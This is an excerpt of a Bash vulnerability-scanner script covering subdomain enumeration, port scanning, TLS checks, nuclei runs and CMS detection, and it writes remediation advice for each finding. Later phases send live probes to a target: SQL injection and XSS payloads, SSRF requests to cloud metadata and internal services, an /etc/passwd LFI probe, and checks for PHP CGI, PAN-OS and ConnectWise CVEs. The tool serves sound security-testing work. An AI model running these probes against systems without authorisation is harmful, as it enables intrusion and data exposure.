...
phase_subdomains() {
    ...
    # These tools use passive DNS (certificate transparency, search engines)
    # They work even with wildcard DNS — only brute-force tools are skipped
    if command -v subfinder &>/dev/null; then
        run_tool_timeout "subfinder" "${sub_dir}/subfinder.txt" 120             subfinder -d "$TARGET" -silent -all 2>/dev/null || true
    fi
    ...
    if command -v sublist3r &>/dev/null; then
        ...
        # If -o flag not supported, stdout capture contains the results
        [[ ! -s "${sub_dir}/sublist3r.txt" ]] &&             cp "${sub_dir}/sublist3r_stdout.txt" "${sub_dir}/sublist3r.txt" 2>/dev/null || true
    fi

    # amass passive (v4 — output format changed, capture both stdout and file)
    if command -v amass &>/dev/null; then
        local amass_timeout=120
        [[ "$SCAN_PROFILE" == "deep" ]] && amass_timeout=300
        # amass v4 writes output to a database by default; use -o for plain text
        run_tool_timeout "amass" "${sub_dir}/amass.txt" "$amass_timeout"             amass enum -passive -d "$TARGET" -o "${sub_dir}/amass_out.txt" 2>/dev/null || true
        # Merge both output locations
        [[ -s "${sub_dir}/amass_out.txt" ]] &&             cat "${sub_dir}/amass_out.txt" >> "${sub_dir}/amass.txt" 2>/dev/null || true
    fi
    ...
    if [[ -n "$_wc_ip" ]]; then
        WILDCARD_DNS=true
        log_warn "Wildcard DNS detected on ${TARGET} (resolves to ${_wc_ip}) — brute force skipped to avoid false positives"
        add_vuln "INFO" "Wildcard DNS Active on ${TARGET}"             "Every subdomain query resolves (wildcard). This is normal for some CDNs but can indicate subdomain takeover risk or cause false-positive subdomain discovery."             "Review DNS zone for wildcard records. Use certificate transparency (crt.sh) for accurate subdomain discovery."             "dig nonexistent.${TARGET} A → ${_wc_ip}"
    fi
    # DNS brute force (gobuster dns)
    ...
    if command -v gobuster &>/dev/null && [[ "$WILDCARD_DNS" == false ]]; then
        ...
        for _wlp in             "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"             "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"             "/usr/share/wordlists/dns/subdomains-top1million-5000.txt"             "/usr/share/amass/wordlists/subdomains.lst"; do
            [[ -f "$_wlp" ]] && wordlist="$_wlp" && break
        done
        # Create minimal built-in list if none found
        if [[ -z "$wordlist" ]]; then
            printf "www\nmail\nftp\napi\ndev\nstaging\nadmin\nblog\nshop\nm\napp\n"                 > "${sub_dir}/builtin_subs.txt"
            wordlist="${sub_dir}/builtin_subs.txt"
        fi
        if [[ -f "$wordlist" ]]; then
            run_tool_timeout "gobuster-dns" "${sub_dir}/gobuster_dns_raw.txt" 180                 gobuster dns -d "$TARGET" -w "$wordlist" -t 50 -q --no-color 2>/dev/null || true
            # gobuster output: "Found: sub.domain.com" — extract domain name only
            grep -oE "([a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}"                 "${sub_dir}/gobuster_dns_raw.txt" 2>/dev/null                 > "${sub_dir}/gobuster_dns.txt" 2>/dev/null || true
        fi
    fi

    # Early wildcard DNS check — use dig for speed (no dnsx dependency)

    # ffuf DNS brute
    if command -v ffuf &>/dev/null && [[ "$WILDCARD_DNS" == false ]]; then
        local wordlist2=""
        for _wlp2 in             "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"             "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"             "${sub_dir}/builtin_subs.txt"; do
            [[ -f "$_wlp2" ]] && wordlist2="$_wlp2" && break
        done
        if [[ -n "$wordlist2" ]]; then
            run_tool_timeout "ffuf-dns" "${sub_dir}/ffuf_dns.txt" 120 \
                ffuf -w "${wordlist2}:FUZZ" -u "http://FUZZ.${TARGET}" \
                -mc 200,301,302,403 -t 50 -silent -o "${sub_dir}/ffuf_dns.json" -of json || true
        fi
    fi

    # Merge ONLY known subdomain output files (not wordlists or stdout logs)
    {
        # Each tool writes to its own file — merge those specific files only
        for _sf in             "${sub_dir}/subfinder.txt"             "${sub_dir}/sublist3r.txt"             "${sub_dir}/amass.txt"             "${sub_dir}/amass_out.txt"             "${sub_dir}/gobuster_dns.txt"; do
            [[ -f "$_sf" ]] && cat "$_sf" 2>/dev/null || true
        done
    }         | sed 's/\[[0-9;]*m//g'         | grep -oE "([a-zA-Z0-9]([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})"         | grep -iE "\.${TARGET}$|^${TARGET}$"         | grep -viE "domainincontrol\.com|parking\.|sedo\.|bodis\.|sedoparking\.|above\.com|afternic\.|dan\.com|undeveloped\.com|hugedomains\."         | sort -u > "${sub_dir}/all_subdomains.txt" 2>/dev/null || true

    # Add from crt.sh — filter parking domains before adding
    if [[ -f "${OUTPUT_DIR}/subdomains/from_crtsh.txt" ]]; then
        grep -iE "\.${TARGET}$|^${TARGET}$" "${OUTPUT_DIR}/subdomains/from_crtsh.txt" 2>/dev/null             | grep -viE "domainincontrol|parking|sedo|bodis|above\.com"             >> "${sub_dir}/all_subdomains.txt" 2>/dev/null || true
    fi

    sort -u "${sub_dir}/all_subdomains.txt" -o "${sub_dir}/all_subdomains.txt" 2>/dev/null || true

    # Read into array — filter parking and wildcard domains
    while IFS= read -r sub; do
        [[ -z "$sub" ]] && continue
        # Skip DNS parking domains (GoDaddy wildcard, etc.)
    ...
    log_ok "Total subdomains found: ${total}"
    ...
    if command -v httpx &>/dev/null && [[ ${total:-0} -gt 0 ]]; then
        # Run httpx and immediately filter output to only valid URL lines
        local _httpx_raw="${sub_dir}/live_subdomains_raw.txt"
        run_tool_timeout "httpx-subdomains" "$_httpx_raw" 120 \
        ...
        # Keep only lines starting with http:// or https://
        grep -E "^https?://[a-zA-Z0-9]" "$_httpx_raw" 2>/dev/null \
            > "${sub_dir}/live_subdomains.txt" 2>/dev/null || true
        local live_count; live_count=$(( $(wc -l < "${sub_dir}/live_subdomains.txt" 2>/dev/null || echo 0) + 0 ))
        log_ok "Live subdomains: ${live_count}"
        # Extract URLs only — httpx adds status/title/tech after the URL
        # Strict validation: URL must start with http:// or https://
        while IFS= read -r h; do
            local url_only; url_only=$(echo "$h" | awk '{print $1}')
            # Must be a real http/https URL
            echo "$url_only" | grep -qE "^https?://[a-zA-Z0-9]" || continue
            # Skip parking domains
    ...
    # dnsx — bulk DNS resolution to validate subdomains and find wildcard/dead records
    if command -v dnsx &>/dev/null && [[ ${total:-0} -gt 0 ]]; then
        run_tool_timeout "dnsx-validate" "${sub_dir}/dnsx_resolved.txt" 60 \
            dnsx -l "${sub_dir}/all_subdomains.txt" -silent -a \
            -resp 2>/dev/null || true
        local resolved; resolved=$(( $(wc -l < "${sub_dir}/dnsx_resolved.txt" 2>/dev/null || echo 0) + 0 ))
        log_ok "dnsx resolved: ${resolved} subdomains with valid DNS"
        # Check for wildcard DNS (potential subdomain takeover false-positive amplifier)
        local wc_test; wc_test=$(echo "acromap-nonexistent-$(date +%s).${TARGET}" | \
            dnsx -silent -a 2>/dev/null | head -1 || echo "")
        if [[ -n "$wc_test" ]]; then
            add_vuln "INFO" "Wildcard DNS Detected on ${TARGET}" \
                "Wildcard DNS resolves all subdomains. Subdomain takeover results may include false positives." \
    ...
    if command -v nmap &>/dev/null; then
        ...
        if [[ ${EUID:-0} -eq 0 ]]; then
            run_tool_timeout "nmap-os" "${nd_dir}/nmap_os.txt" 90 \
                nmap -O --osscan-guess -T4 "$TARGET" 2>/dev/null || true
            if grep -qi "Running:" "${nd_dir}/nmap_os.txt" 2>/dev/null; then
                local os_guess; os_guess=$(grep "Running:" "${nd_dir}/nmap_os.txt" | head -1)
                log_ok "OS detected: ${os_guess}"
...
phase_tcp_scan() {
    ...
    # RustScan (fast) → nmap deep
    if command -v rustscan &>/dev/null; then
        log_info "RustScan: fast port discovery..."
        local rs_timeout=180; [[ "$SCAN_PROFILE" == "quick" ]] && rs_timeout=60
    ...
    # CRITICAL FIX: Use arrays instead of strings — IFS=$'\n\t' won't split space-separated strings
    ...
    case "$SCAN_PROFILE" in
        deep)
            port_range=(-p-)
            nmap_flags=(-sV -sC -T4 -A)
            nmap_timeout=900
            ;;
        standard)
            port_range=(--top-ports 5000)
            nmap_flags=(-sV -sC -T4)
            nmap_timeout=360
            ;;
        quick)
            port_range=(--top-ports 200)
            nmap_flags=(-sV -T4)
            nmap_timeout=120
            ;;
    esac

    # FIX: Remove -oN (same file as run_tool outfile would double-write). Keep -oX and -oG.
    run_tool_timeout "nmap-tcp" "${nmap_dir}/nmap_tcp.txt" "$nmap_timeout" \
        nmap "${nmap_flags[@]}" "${port_range[@]}" \
        -oX "${nmap_dir}/nmap_tcp.xml" \
        -oG "${nmap_dir}/nmap_grep.txt" \
        "$TARGET" 2>/dev/null || true

    # Grab open ports — nmap result overwrites rustscan only if nmap found ports
    if [[ -f "${nmap_dir}/nmap_tcp.txt" ]]; then
        local nmap_ports; nmap_ports=$(grep "^[0-9]*/tcp.*open" "${nmap_dir}/nmap_tcp.txt" 2>/dev/null \
            | awk '{print $1}' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//' || echo "")
        # Only overwrite OPEN_PORTS if nmap found something (preserve rustscan result otherwise)
        [[ -n "$nmap_ports" ]] && OPEN_PORTS="$nmap_ports"
        WEB_PORTS=$(grep "^[0-9]*/tcp.*open.*http" "${nmap_dir}/nmap_tcp.txt" 2>/dev/null \
            | awk '{print $1}' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//' || echo "")
        [[ -z "$WEB_PORTS" ]] && grep -qiE "80/tcp|443/tcp|8080/tcp|8443/tcp" \
            "${nmap_dir}/nmap_tcp.txt" 2>/dev/null && WEB_PORTS="80,443"
        log_ok "Open TCP ports: ${OPEN_PORTS:-none}"
        log_ok "Web ports: ${WEB_PORTS:-none}"
    fi

    # masscan full
    if command -v masscan &>/dev/null && [[ ${EUID:-0} -eq 0 ]]; then
        local masscan_rate=2000
        [[ "$SCAN_PROFILE" == "deep" ]] && masscan_rate=10000
        run_tool_timeout "masscan-full" "${OUTPUT_DIR}/masscan/full_stdout.log" 300 \
            masscan "$TARGET" -p1-65535 --rate "$masscan_rate" \
            -oL "${OUTPUT_DIR}/masscan/full.txt" 2>/dev/null || true
    fi

    # NSE vulnerability scripts — only if open ports exist
        ...
        if [[ -f "$vf" ]]; then
            grep -qiE "shellshock|CVE-2014-6271" "$vf" && \
                add_vuln "CRITICAL" "Shellshock (CVE-2014-6271)" \
                    "Bash vulnerability allowing remote code execution via crafted environment variables." \
                    "Update bash immediately. Patch all systems." \
                    "nmap vuln script: shellshock detected"

            grep -qiE "ms17-010|EternalBlue" "$vf" && \
                add_vuln "CRITICAL" "EternalBlue — MS17-010 (SMB RCE)" \
                    "Critical SMB vulnerability used by WannaCry/NotPetya ransomware for wormable RCE." \
                    "Apply MS17-010 patch, disable SMBv1, block ports 139/445." \
                    "nmap vuln: ms17-010 confirmed"

            grep -qiE "CVE-2019-0708|BlueKeep" "$vf" && \
                add_vuln "CRITICAL" "BlueKeep (CVE-2019-0708)" \
                    "Pre-auth RCE in Windows RDP. Wormable vulnerability." \
                    "Apply KB4499175 patch, disable RDP if unused, enable NLA." \
                    "nmap vuln: BlueKeep detected"

            grep -qiE "vsftpd.*backdoor|CVE-2011-2523" "$vf" && \
                add_vuln "CRITICAL" "vsFTPd 2.3.4 Backdoor (CVE-2011-2523)" \
                    "Backdoor in vsFTPd 2.3.4 opens a shell on port 6200 when triggered." \
                    "Update vsFTPd immediately. Audit all FTP configurations." \
                    "nmap vuln: vsftpd 2.3.4 backdoor"
        fi
    fi
    ...
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        ...
        if command -v whatweb &>/dev/null; then
            run_tool_timeout "whatweb-${slug}" "${OUTPUT_DIR}/whatweb/whatweb_${slug}.txt" 30 \
                whatweb --no-errors -a 3 "$web_url" 2>/dev/null || true
            local wf="${OUTPUT_DIR}/whatweb/whatweb_${slug}.txt"
            if [[ -f "$wf" ]]; then
                grep -qi "WordPress"   "$wf" && IS_WORDPRESS=true && CMS_TYPE="WordPress"
                grep -qi "Drupal"      "$wf" && IS_DRUPAL=true   && CMS_TYPE="Drupal"
                grep -qi "Joomla"      "$wf" && IS_JOOMLA=true   && CMS_TYPE="Joomla"
                if grep -qi "PHP/[0-9]" "$wf"; then
                    local php_ver
                    php_ver=$(grep -oi "PHP/[0-9][.0-9]*" "$wf" | head -1)
                    if echo "$php_ver" | grep -qE "PHP/5\.|PHP/7\."; then
                        add_vuln "HIGH" "Outdated PHP Version (${php_ver})" \
                            "PHP ${php_ver} has reached end-of-life and contains unpatched CVEs including RCE vulnerabilities." \
                            "Upgrade to PHP 8.2+ immediately." \
                            "$php_ver detected by whatweb"
                    fi
                fi
                if grep -qi "Apache/[0-9]" "$wf"; then
                    local apache_ver
                    apache_ver=$(grep -oi "Apache/[0-9][.0-9]*" "$wf" | head -1)
                    add_vuln "INFO" "Apache Web Server Identified (${apache_ver})" \
                        "Apache version visible — check for known CVEs for this version." \
                        "Keep Apache updated. Hide version with ServerTokens Prod." \
                        "$apache_ver"
                fi
            fi
        fi
        ...
        if command -v wafw00f &>/dev/null; then
            run_tool_timeout "wafw00f-${slug}" "${OUTPUT_DIR}/wafw00f/wafw00f_${slug}.txt" 30 \
                wafw00f -a "$web_url" 2>/dev/null || true
            if grep -qiE "is behind|protected by|detected" \
                "${OUTPUT_DIR}/wafw00f/wafw00f_${slug}.txt" 2>/dev/null; then
                HAS_WAF=true
                local waf_name; waf_name=$(grep -i "is behind\|protected by\|detected" \
                    "${OUTPUT_DIR}/wafw00f/wafw00f_${slug}.txt" | head -1)
                log_ok "WAF detected: ${waf_name}"
                add_vuln "INFO" "Web Application Firewall (WAF) Detected" \
                    "A WAF is active. Bypass techniques may be required for further testing." \
                    "Ensure WAF rules are regularly updated and properly tuned." \
                    "$waf_name"
            fi
        fi
    done

    log_ok "Phase 9 complete. CMS: ${CMS_TYPE:-none} | WAF: ${HAS_WAF}"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}
...
phase_ssl() {
    ...
    # Check if any HTTPS ports exist
    local ssl_ports=()
    for p in 443 8443 4443 9443; do
        echo "$OPEN_PORTS" | grep -qE "(^|,)${p}(,|$)" && ssl_ports+=("$p")
    done
    [[ ${#ssl_ports[@]} -eq 0 ]] && ssl_ports=(443)

    # Detect sslyze version once before the port loop
    local sslyze_ver_major=0
    if command -v sslyze &>/dev/null; then
        sslyze_ver_major=$(sslyze --version 2>/dev/null | grep -oE '[0-9]+' | head -1 || echo "0")
        log_info "sslyze version: ${sslyze_ver_major}.x"
    fi

    for ssl_port in "${ssl_ports[@]}"; do
        # sslscan
        if command -v sslscan &>/dev/null; then
            run_tool_timeout "sslscan-${ssl_port}" "${OUTPUT_DIR}/sslscan/sslscan_${ssl_port}.txt" 60 \
                sslscan --no-colour "${TARGET}:${ssl_port}" 2>/dev/null || true
            local sf="${OUTPUT_DIR}/sslscan/sslscan_${ssl_port}.txt"
            if [[ -f "$sf" ]]; then
                grep -qi "SSLv2.*enabled" "$sf" && \
                    add_vuln "CRITICAL" "SSLv2 Enabled (Port ${ssl_port})" \
                        "SSLv2 is broken and allows DROWN attack decryption of TLS traffic." \
                        "Disable SSLv2 immediately in all SSL/TLS configurations." \
                        "SSLv2 enabled on port ${ssl_port}"
                grep -qi "SSLv3.*enabled" "$sf" && \
                    add_vuln "CRITICAL" "SSLv3 Enabled — POODLE Attack (Port ${ssl_port})" \
                        "SSLv3 is vulnerable to the POODLE attack (CVE-2014-3566), allowing session decryption." \
                        "Disable SSLv3. Use TLSv1.2 minimum." \
                        "SSLv3 enabled on port ${ssl_port}"
                grep -qi "TLSv1\.0.*enabled" "$sf" && \
                    add_vuln "HIGH" "TLS 1.0 Enabled (Port ${ssl_port})" \
                        "TLS 1.0 is deprecated and vulnerable to BEAST, POODLE attacks. PCI-DSS prohibits it." \
                        "Disable TLS 1.0 and 1.1. Configure minimum TLS 1.2." \
                        "TLS 1.0 enabled on port ${ssl_port}"
                grep -qi "TLSv1\.1.*enabled" "$sf" && \
                    add_vuln "MEDIUM" "TLS 1.1 Enabled (Port ${ssl_port})" \
                        "TLS 1.1 is deprecated and should not be used in production." \
                        "Disable TLS 1.1. Use TLS 1.2/1.3 only." \
                        "TLS 1.1 enabled on port ${ssl_port}"
                grep -qiE "(Accepted|enabled).*\b(RC4|DES|3DES|NULL|EXPORT|anon)\b|\b(RC4|3DES|DES)\b.*Accepted" "$sf" && \
                    add_vuln "HIGH" "Weak Cipher Suites Enabled (Port ${ssl_port})" \
                        "Weak ciphers (RC4, DES, NULL, EXPORT) allow decryption of intercepted traffic." \
                        "Configure only strong cipher suites. Use Mozilla SSL config generator." \
                        "$(grep -iE 'RC4|DES|NULL|EXPORT|anon' "$sf" | head -3 | tr '\n' ' ')"
                grep -qiE "self.signed|Certificate not trusted" "$sf" && \
                    add_vuln "MEDIUM" "Self-Signed SSL Certificate (Port ${ssl_port})" \
                        "Self-signed certificate triggers browser warnings and enables MITM attacks." \
                        "Install a certificate from a trusted CA (e.g. Let's Encrypt)." \
                        "SSL: self-signed certificate detected"
                grep -qiE "Expired|Not valid after.*(19|20[0-2][0-9])" "$sf" && \
                    add_vuln "HIGH" "Expired SSL Certificate (Port ${ssl_port})" \
                        "Expired certificate breaks HTTPS and triggers browser security warnings." \
                        "Renew SSL certificate immediately. Set up auto-renewal." \
                        "SSL certificate expired"
            fi
        fi

        # sslyze — use pre-detected version flags (version detected once before loop)
        if command -v sslyze &>/dev/null; then
            local sslyze_args=()
            if [[ "${sslyze_ver_major:-0}" -ge 5 ]]; then
                # sslyze 5.x modern flags
                sslyze_args=(
                    "${TARGET}:${ssl_port}"
                    --certinfo --heartbleed --openssl_ccs_injection
                    --robot --compression --fallback_scsv --reneg
                    --json_out "${OUTPUT_DIR}/sslscan/sslyze_${ssl_port}.json"
                )
            else
                # sslyze 3.x/4.x legacy flags
                sslyze_args=(
                    "${TARGET}:${ssl_port}"
                    --certinfo --heartbleed --openssl_ccs
                    --robot --compression --fallback --reneg
                    --json_out "${OUTPUT_DIR}/sslscan/sslyze_${ssl_port}.json"
                )
            fi
            run_tool_timeout "sslyze-${ssl_port}" "${OUTPUT_DIR}/sslscan/sslyze_${ssl_port}.txt" 60 \
                sslyze "${sslyze_args[@]}" 2>/dev/null || true
            local sz="${OUTPUT_DIR}/sslscan/sslyze_${ssl_port}.txt"
            local szj="${OUTPUT_DIR}/sslscan/sslyze_${ssl_port}.json"
            # Use whichever output file has content
            local sz_check="$sz"
            ...
            if [[ -f "$sz_check" ]]; then
                grep -qiE "HEARTBLEED.*VULNERABLE|heartbleed.*True|is_vulnerable.*true" "$sz_check" && \
                    add_vuln "CRITICAL" "Heartbleed Vulnerability (CVE-2014-0160) — Port ${ssl_port}" \
                        ...
                        "Update OpenSSL immediately to 1.0.1g+. Revoke and reissue all certificates." \
                        "sslyze heartbleed: VULNERABLE"
                grep -qiE "ROBOT.*VULNERABLE|robot.*True|robot_attack.*VULNERABLE" "$sz_check" && \
                    add_vuln "HIGH" "ROBOT Attack Vulnerability (Port ${ssl_port})" \
                        "Return Of Bleichenbacher's Oracle Threat — allows RSA decryption of TLS sessions." \
                        "Disable RSA encryption key exchange. Use ECDHE/DHE only." \
                        "sslyze ROBOT: VULNERABLE"
                grep -qiE "OPENSSL_CCS.*VULNERABLE|openssl_ccs.*True|ccs_injection.*VULNERABLE" "$sz_check" && \
                    add_vuln "HIGH" "OpenSSL CCS Injection (CVE-2014-0224) — Port ${ssl_port}" \
                ...
                grep -qiE "compression.*ENABLED|CRIME|supports_compression.*true" "$sz_check" && \
                    add_vuln "MEDIUM" "SSL Compression Enabled — CRIME Attack (Port ${ssl_port})" \
                        ...
                        "Disable SSL/TLS compression globally." \
                        "sslyze compression: enabled"
            fi
        fi

        # nmap ssl scripts (no -oN — run_tool_timeout handles stdout redirect)
        run_tool_timeout "nmap-ssl-${ssl_port}" "${OUTPUT_DIR}/nmap/nmap_ssl_${ssl_port}.txt" 60 \
            nmap -sV -p "$ssl_port" \
            --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-dh-params,ssl-cert \
            "$TARGET" 2>/dev/null || true
    done
...
phase_cms() {
    ...
    if [[ "$IS_WORDPRESS" == true ]] || \
       curl -s -L --max-time 15 "${primary_url}/wp-login.php" 2>/dev/null | grep -qiE "wordpress|wp-"; then
        IS_WORDPRESS=true; CMS_TYPE="WordPress"
    ...
    # Drupal
    if [[ "$IS_DRUPAL" == true ]] || \
       curl -s -L --max-time 15 "${primary_url}/CHANGELOG.txt" 2>/dev/null | grep -qi "drupal"; then
        IS_DRUPAL=true; CMS_TYPE="Drupal"
    ...
    # Joomla
    if [[ "$IS_JOOMLA" == true ]] || \
       curl -s -L --max-time 15 "${primary_url}/administrator" 2>/dev/null | grep -qi "joomla"; then
        IS_JOOMLA=true; CMS_TYPE="Joomla"
...
phase_nuclei() {
    ...
    local nuclei_tags="cve,misconfig,exposed-panels,default-login,takeover"
    [[ "$SCAN_PROFILE" == "deep" ]] && \
        nuclei_severity="info,low,medium,high,critical" && \
        nuclei_tags="cve,misconfig,exposed-panels,default-login,takeover,xss,sqli,ssrf,rce,lfi"
    [[ "$SCAN_PROFILE" == "quick" ]] && \
        nuclei_severity="high,critical" && \
        nuclei_tags="cve,exposed-panels"

    local nuclei_t=300; [[ "$SCAN_PROFILE" == "deep" ]] && nuclei_t=600

    # Detect nuclei major version to select correct flags
    local nuclei_ver; nuclei_ver=$(nuclei -version 2>&1 | grep -oE '[0-9]+' | head -1 || echo "2")
    local nuclei_sev_flag="-severity"
    local nuclei_json_flag="-json-export"
    if [[ "$nuclei_ver" -ge 3 ]]; then
        nuclei_sev_flag="-s"
        nuclei_json_flag="-je"
    fi
    ...
    run_tool_timeout "nuclei" "${OUTPUT_DIR}/nuclei/nuclei_results.txt" "$nuclei_t" \
        ...
        "$nuclei_sev_flag" "$nuclei_severity" -tags "$nuclei_tags" \
    ...
    if [[ -f "$nf" ]] && [[ -s "$nf" ]]; then
        local crit; crit=$(( $(grep -c "\[critical\]" "$nf" 2>/dev/null || echo 0) + 0 ))
        local high; high=$(( $(grep -c "\[high\]"     "$nf" 2>/dev/null || echo 0) + 0 ))
        local med;  med=$(( $(grep -c "\[medium\]"    "$nf" 2>/dev/null || echo 0) + 0 ))

        [[ ${crit:-0} -gt 0 ]] && \
            add_vuln "CRITICAL" "Nuclei: ${crit} Critical Vulnerabilities Found" \
                "Nuclei detected critical severity issues using template-based detection." \
                "Review nuclei_results.txt for full details of each finding." \
                "$(grep '\[critical\]' "$nf" | head -5 | tr '\n' ' ')"

        [[ ${high:-0} -gt 0 ]] && \
            add_vuln "HIGH" "Nuclei: ${high} High Severity Issues Found" \
                "Nuclei detected high severity vulnerabilities." \
                "Review and remediate each finding in nuclei_results.txt." \
                "$(grep '\[high\]' "$nf" | head -5 | tr '\n' ' ')"

        [[ ${med:-0} -gt 0 ]] && \
            add_vuln "MEDIUM" "Nuclei: ${med} Medium Severity Issues Found" \
                "Nuclei detected medium severity misconfigurations and vulnerabilities." \
                "Review nuclei_results.txt for full findings list." \
                "$(grep '\[medium\]' "$nf" | head -5 | tr '\n' ' ')"

        log_ok "Nuclei found: ${crit} critical, ${high} high, ${med} medium"

        # jq structured parse — extract template ID + matched URL for cleaner evidence
        if [[ "$JQ_AVAILABLE" == true ]] && [[ -s "$nj" ]]; then
            log_section "jq — parsing nuclei JSON for structured findings..."
            local jq_summary="${OUTPUT_DIR}/nuclei/nuclei_summary.txt"
            jq -r 'select(.info.severity=="critical" or .info.severity=="high") |
                "[" + (.info.severity|ascii_upcase) + "] " + .info.name +
                " → " + .host + " (" + .template_id + ")"' \
                "$nj" 2>/dev/null > "$jq_summary" || true
            if [[ -s "$jq_summary" ]]; then
                log_ok "jq nuclei summary: $(wc -l < "$jq_summary") critical/high findings structured"
                # Write clean summary to report dir too
                cp "$jq_summary" "${OUTPUT_DIR}/reports/nuclei_top_findings.txt" 2>/dev/null || true
            fi
        fi
    else
        log_info "Nuclei found no issues with current template set"
    fi
...
phase_sqli() {
    ...
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        ...
        log_section "Manual SQL injection probes (${web_url})..."
        local common_params=("id" "page" "search" "q" "cat" "item" "user" "name")
        for param in "${common_params[@]}"; do
            # BUG FIX: URL-encode the payload; bare single quotes in URL break curl silently
            local sqli_payload; sqli_payload=$(python3 -c \
            ...
            if [[ ${probe_resp:-0} -gt 0 ]]; then
                add_vuln "CRITICAL" "SQL Error-Based Injection — Parameter: ${param} (${web_url})" \
                    "Database error returned on SQL injection probe — error-based SQLi likely exploitable." \
                    "Implement parameterized queries. Disable verbose error messages in production." \
                    "${web_url}?${param}=' — SQL error returned"
                break
            fi
        done
    done
...
phase_xss() {
    ...
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        ...
        # Manual XSS payloads
        log_section "Manual XSS probes (${web_url})..."
        local xss_payloads=(
        ...
        for payload in "${xss_payloads[@]}"; do
            local enc_payload; enc_payload=$(python3 -c \
            ...
            for xss_param in q search s name input msg comment query term; do
                ...
                if [[ ${xss_resp:-0} -gt 0 ]]; then
                    add_vuln "HIGH" "Reflected XSS — Manual Probe (${web_url}?${xss_param}=)" \
                        "Reflected XSS payload returned unescaped in server response." \
                        "Implement output encoding. Use strict Content Security Policy." \
                        "Payload reflected: ${payload}"
                    xss_found=true
                    break
                fi
            done
            [[ "$xss_found" == true ]] && break
        done
        ...
        # SSRF probe
        local ssrf_paths=("?url=http://169.254.169.254/latest/meta-data/" \
                          "?path=http://127.0.0.1:22" \
                          "?fetch=http://localhost:6379")
        for ssrf in "${ssrf_paths[@]}"; do
            local ssrf_resp; ssrf_resp=$(curl -s --max-time 8 \
                "${web_url}${ssrf}" 2>/dev/null | head -5 || echo "")
            if echo "$ssrf_resp" | grep -qiE "ami-id|instance-id|availability-zone|SSH-2\.0|\+OK redis"; then
                add_vuln "CRITICAL" "Server-Side Request Forgery (SSRF) Detected" \
                    "SSRF allows attacker to make server-side requests to internal services — cloud metadata, Redis, internal APIs." \
                    "Whitelist allowed URL schemes and hosts. Block internal IP ranges. Implement SSRF filter." \
                    "SSRF path: ${ssrf} — internal response leaked"
                break
            fi
        done
        ...
        for lfi in "${lfi_payloads[@]}"; do
            ...
            if [[ ${lfi_resp:-0} -gt 0 ]]; then
                add_vuln "CRITICAL" "Local File Inclusion (LFI) — /etc/passwd Read" \
                    ...
                    "${web_url}?file=../../etc/passwd — content returned"
                break
            fi
        done
    done
...
phase_cve_checks() {
    ...
    log_section "Running 2024–2026 CVE-specific fingerprint checks..."
    ...
    if echo "$OPEN_PORTS" | grep -qE "(^|,)22(,|$)"; then
        ...
        if echo "$ssh_banner" | grep -qiE "OpenSSH_[1-8]\.[0-8]|OpenSSH_9\.[0-7]p[01]|OpenSSH_9\.[0-7] "; then
            ...
            if echo "$ssh_banner" | grep -qiE \
               "OpenSSH_[1-7]\.|OpenSSH_8\.[0-9]|OpenSSH_9\.[0-7]"; then
        ...
        echo "Check complete" >> "${cve_dir}/CVE-2024-6387.txt"
    fi
    ...
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        ...
        local php_resp; php_resp=$(curl -s --max-time 10 --max-filesize 51200 \
            ...
            -d "<?php echo 'CVE-2024-4577-TEST'; ?>" 2>/dev/null || echo "")
        echo "CVE-2024-4577 probe: $(echo "$php_resp" | head -1)" > "${cve_dir}/CVE-2024-4577.txt"
        if echo "$php_resp" | grep -q "CVE-2024-4577-TEST"; then
            add_vuln "ZERO_DAY" "CVE-2024-4577: PHP CGI Remote Code Execution — Actively Exploited" \
                ...
                "${web_url}: CVE-2024-4577 RCE confirmed"
        fi
    done
    ...
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local panos_resp; panos_resp=$(curl -s --max-time 10 \
            -H "Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/hour/aaa" \
            "${web_url}/ssl-vpn/hipreport.esp" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
        echo "CVE-2024-3400 probe: HTTP ${panos_resp}" > "${cve_dir}/CVE-2024-3400.txt"
        if [[ "$panos_resp" =~ ^(200|500)$ ]]; then
            local is_panos; is_panos=$(( $( curl -s --max-time 10 --max-filesize 51200 "${web_url}" 2>/dev/null \
                | head -c 4096 | grep -ci "GlobalProtect\|Palo Alto\|PAN-OS" | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
            [[ ${is_panos:-0} -gt 0 ]] && \
                add_vuln "CRITICAL" "CVE-2024-3400: PAN-OS GlobalProtect Command Injection" \
                    "PAN-OS GlobalProtect gateway command injection allows unauthenticated OS command execution as root. CVSS 10.0." \
                    "Update PAN-OS. Apply Palo Alto Security Advisory PAN-SA-2024-0006. Disable GlobalProtect if unused." \
                    "${web_url}: PAN-OS GlobalProtect detected with CVE-2024-3400 indicator"
        fi
    done
    ...
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local fortinet_check; fortinet_check=$(( $( curl -s --max-time 10 --max-filesize 51200 \
    ...
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local cw_check; cw_check=$(curl -s --max-time 10 \
            "${web_url}/SetupWizard.aspx/" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
        echo "CVE-2024-1709 ConnectWise probe: HTTP ${cw_check}" > "${cve_dir}/CVE-2024-1709.txt"
        if [[ "$cw_check" == "200" ]]; then
            add_vuln "CRITICAL" "CVE-2024-1709: ConnectWise ScreenConnect Auth Bypass" \
                ...
                "${web_url}/SetupWizard.aspx/ — HTTP 200 (auth bypass indicator)"
        fi
    done

